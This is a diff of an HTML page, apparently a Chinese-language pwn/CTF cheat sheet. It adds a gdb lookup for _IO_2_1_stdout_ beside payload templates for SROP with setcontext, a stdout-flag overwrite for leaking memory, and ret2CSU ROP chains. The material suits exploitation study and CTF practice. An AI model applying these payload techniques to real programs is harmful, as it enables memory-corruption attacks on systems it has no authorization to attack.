@@ -170,7 +170,10 @@
 
 <p>SROP+伪造栈帧,按需布置伪栈帧和ROP链即可:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">frame &#x3D; SigreturnFrame()</span><br><span class="line">frame.rax &#x3D; 0</span><br><span class="line">frame.rsp &#x3D; ROP_address</span><br><span class="line">frame.rip &#x3D; ret</span><br><span class="line"></span><br><span class="line">frame_str &#x3D; str(frame).ljust(frame_size,&quot;\x00)</span><br><span class="line">payload &#x3D; p64(the_gadget) + p64(frame_addr) + p64(0)*4 + p64(setcontext+61) + frame_str[0x28:] </span><br><span class="line">payload +&#x3D; .....          #other stuff and ROP chain</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="IO-2-1-stdout"><a href="#IO-2-1-stdout" class="headerlink" title="_IO_2_1_stdout_"></a>_IO_2_1_stdout_</h3><p>覆盖为:</p>
+<h3 id="IO-2-1-stdout"><a href="#IO-2-1-stdout" class="headerlink" title="_IO_2_1_stdout_"></a>_IO_2_1_stdout_</h3><p>gdb查找语句:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p &amp;_IO_2_1_stdout_</span><br></pre></td></tr></table></figure>
+
+<p>覆盖为:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; p64(0xfbad1800)+p64(0x0)*3+&#39;\x00&#39;</span><br></pre></td></tr></table></figure>
 
 <h3 id="ret2CSU"><a href="#ret2CSU" class="headerlink" title="ret2CSU"></a>ret2CSU</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; p6r + p64(0) + p64(1) + fuction_ptr\ </span><br><span class="line">    + arg3 + arg2 + arg1 + mov_call\</span><br><span class="line">    + &quot;\x00&quot;*56 + return_address</span><br></pre></td></tr></table></figure>
